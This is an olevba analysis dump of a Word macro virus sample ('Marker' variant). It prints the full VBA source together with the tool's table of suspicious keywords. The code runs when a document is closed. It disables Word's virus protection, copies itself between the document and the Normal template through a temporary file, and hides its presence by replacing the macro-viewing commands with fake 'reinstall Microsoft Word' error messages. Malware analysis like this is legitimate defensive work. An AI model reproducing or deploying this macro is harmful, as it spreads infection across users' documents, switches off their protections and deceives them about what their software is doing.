olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.jy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.jy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_close()
On Error Resume Next
Dim di, ni As Boolean
Dim Mymark As String
Mymark = "<-- 2 new marker"
Options.VirusProtection = False
di = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Find("<-- 2 new marker", 1, 1, 5, 200)
ni = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Find("<-- 2 new marker", 1, 1, 5, 200)
If (ni = True) And (di <> True) Then
    ourcode = NormalTemplate.VBProject.VBComponents("Thisdocument").CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents("Thisdocument").CodeModule.CountOfLines)
    hidecode = NormalTemplate.VBProject.VBComponents("Hider831912").CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents("Hider831912").CodeModule.CountOfLines)
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
    Open "c:\himem.sys" For Output As #1
    Print #1, ourcode
    Close #1
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\himem.sys"
    Kill ("c:\himem.sys")
    Open "c:\himem.sys" For Output As #1
    Print #1, "Attribute VB_Name = " + Chr$(34) + "Hider831912" + Chr$(34)
    Print #1, hidecode
    Close #1
    ActiveDocument.VBProject.VBComponents.Import "c:\himem.sys"
    Kill ("c:\himem.sys")
End If
If (di = True) And (ni <> True) Then
    ourcode = ActiveDocument.VBProject.VBComponents("Thisdocument").CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents("Thisdocument").CodeModule.CountOfLines)
    hidecode = ActiveDocument.VBProject.VBComponents("Hider831912").CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents("Hider831912").CodeModule.CountOfLines)
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
    Open "c:\himem.sys" For Output As #1
    Print #1, ourcode
    Close #1
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\himem.sys"
    Kill ("c:\himem.sys")
    Open "c:\himem.sys" For Output As #1
    Print #1, "Attribute VB_Name = " + Chr$(34) + "Hider831912" + Chr$(34)
    Print #1, hidecode
    Close #1
    NormalTemplate.VBProject.VBComponents.Import "c:\himem.sys"
    Kill ("c:\himem.sys")
    NormalTemplate.Save
End If
End Sub




-------------------------------------------------------------------------------
VBA MACRO Hider831912.bas 
in file: ./Virus.MSWord.Marker.jy - OLE stream: 'Macros/VBA/Hider831912'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub viewvbcode()
    ret = MsgBox("Configuration error, please reinstall Microsoft Word", vbCritical, "Microsoft Word")
End Sub

Sub toolsmacro()
    ret = MsgBox("Configuration error, please reinstall Microsoft Word", vbCritical, "Microsoft Word")
End Sub

Sub viewcode()
    ret = MsgBox("Configuration error, please reinstall Microsoft Word", vbCritical, "Microsoft Word")
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

